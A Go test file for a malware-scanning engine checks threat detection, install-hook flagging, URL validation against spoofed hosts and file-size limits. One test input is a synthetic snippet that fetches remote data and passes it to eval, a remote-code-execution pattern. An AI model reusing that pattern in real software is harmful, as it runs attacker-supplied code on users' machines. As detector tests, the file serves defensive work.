package engine

import (
	"os"
	"path/filepath"
	"strings"
	"testing"
)

func TestThreatDetection(t *testing.T) {
	r := NewReport("synthetic", "test")
	ScanBytes(r, "app.js", []byte("const s = await axios.get('https://example.test'); eval(s.data.cookie);\n"))
	Finalize(r)
	if r.Score == 0 || len(r.Findings) == 0 {
		t.Fatalf("expected findings: %+v", r)
	}
}
func TestOfflineFolder(t *testing.T) {
	dir := t.TempDir()
	os.WriteFile(filepath.Join(dir, "package.json"), []byte(`{"scripts":{"postinstall":"node install.js"}}`), 0600)
	r, e := ScanDir(dir)
	if e != nil || len(r.Findings) == 0 {
		t.Fatalf("scan offline failed: %v %+v", e, r)
	}
}
func TestClean(t *testing.T) {
	r := NewReport("synthetic", "test")
	ScanBytes(r, "clean.py", []byte("print('hello world')\n"))
	Finalize(r)
	if r.Score != 0 || r.FilesScanned != 1 {
		t.Fatalf("unexpected %v", r)
	}
}
func TestRejectNonPublicURL(t *testing.T) {
	for _, u := range []string{"http://github.com/a/b", "https://127.0.0.1/a/b", "https://github.com.evil.test/a/b", "https://github.com:443/a/b"} {
		if _, _, _, err := ParseRepo(u); err == nil {
			t.Errorf("accepted %s", u)
		}
	}
	if h, o, r, e := ParseRepo("github.com/ots/example"); e != nil || h != "github.com" || o != "ots" || r != "example" {
		t.Fatalf("valid failed: %s %s %s %v", h, o, r, e)
	}
}
func TestLimit(t *testing.T) {
	r := NewReport("test", "test")
	ScanBytes(r, "a.js", []byte(strings.Repeat("A", MaxFileBytes+1)))
	Finalize(r)
	if r.FilesPartial != 1 || r.FilesSkipped != 0 {
		t.Fatal("oversized file should be explicitly partially inspected, not silently skipped")
	}
}
